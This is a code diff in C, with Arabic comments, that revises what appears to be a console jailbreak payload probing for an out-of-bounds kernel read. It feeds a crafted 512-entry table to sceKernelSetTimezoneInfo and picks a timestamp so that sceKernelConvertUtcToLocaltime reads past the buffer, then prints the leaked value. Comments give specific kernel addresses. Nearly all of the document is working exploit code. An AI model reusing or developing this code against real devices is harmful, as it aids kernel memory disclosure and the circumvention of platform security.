@@ -127,7 +127,7 @@ int _main(struct thread *td) {
     jailbreak();
     initSysUtil();
 
-    printf_debug("=== timezone v2 ===\n");
+    printf_debug("=== timezone infoleak v3 ===\n");
 
     static uint8_t data[512 * 16];
     memset(data, 0, sizeof(data));
@@ -135,13 +135,8 @@ int _main(struct thread *td) {
     for (int i = 0; i < 512; i++) {
         *(long*)(data + i * 16)      = (long)i * 0x1000;
         *(int*)(data  + i * 16 + 8)  = 0x41410000 + i;
-        // نضع dst = 0 لكل entries إلا آخر واحدة
-        // هذا يجبر الـ loop الداخلي يكمل
-        *(int*)(data  + i * 16 + 12) = 0;
+        *(int*)(data  + i * 16 + 12) = 0;  // كل dst = 0
     }
-
-    // آخر entry dst = 1 لإيقاف الـ loop
-    *(int*)(data + 511 * 16 + 12) = 1;
 
     int r = sceKernelSetTimezoneInfo(data, 512);
     printf_debug("set_timezone r=%d\n", r);
@@ -151,7 +146,9 @@ int _main(struct thread *td) {
     int  out_dst   = 0;
 
     // timestamp بين entry[510] و entry[511]
-    // لإجبار uVar6 = 510 ثم الـ loop يصل لـ 512
+    // uVar6 = 510
+    // loop يصل لـ iVar7 = 2
+    // يقرأ من index = 512 = خارج buffer!
     long timestamp = 510 * 0x1000 + 1;
 
     r = sceKernelConvertUtcToLocaltime(
@@ -167,9 +164,14 @@ int _main(struct thread *td) {
     printf_debug("out_tz[1]=0x%lx\n", out_tz[1]);
     printf_debug("out_dst  =0x%x\n",  out_dst);
 
-    // لو out_dst يحتوي على قيمة من خارج الـ buffer:
-    if (out_dst != 0 && out_dst != 1) {
-        printf_debug("[+] OOB READ - leaked=0x%x\n", out_dst);
+    // لو out_dst != 0 = قرأنا من خارج buffer
+    // DAT_ffffffff844d1790 + 4 = 0x844d1794
+    // DAT_ffffffff844d1798 + 4 = 0x844d179c
+    if (out_dst != 0) {
+        printf_debug("[+] OOB READ!\n");
+        printf_debug("leaked = 0x%x\n", out_dst);
+    } else {
+        printf_debug("[-] dst = 0, loop completed without OOB\n");
     }
 
     return 0;
